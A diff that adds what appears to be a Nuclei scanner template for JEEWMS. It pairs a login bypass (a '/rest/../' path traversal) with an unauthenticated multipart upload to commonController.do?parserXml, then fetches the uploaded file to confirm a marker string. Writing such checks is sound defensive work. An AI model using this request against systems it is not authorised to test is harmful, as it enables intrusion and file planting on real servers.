@@ -1,0 +1,36 @@
+id: JEEWMS-login-commonController-upload
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: JEEWMS-commonController.do? ParserXML exists for file upload /rest/../为登录饶过
+  reference:
+    - https://gitee.com/erzhongxmu/JEEWMS/issues/IBFTZ7
+  tags: tags
+variables:
+  filename: "{{rand_base(6)}}"
+http:
+  - raw:
+      - |-
+        POST /rest/../commonController.do?parserXml HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryHRhkXyQjTSAk8j8c
+        Content-Length: 184
+
+
+        ------WebKitFormBoundaryHRhkXyQjTSAk8j8c
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.txt"
+        Content-Type: image/png
+
+        whoisceshi
+        ------WebKitFormBoundaryHRhkXyQjTSAk8j8c--
+      - |+
+        GET /{{filename}}.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - whoisceshi
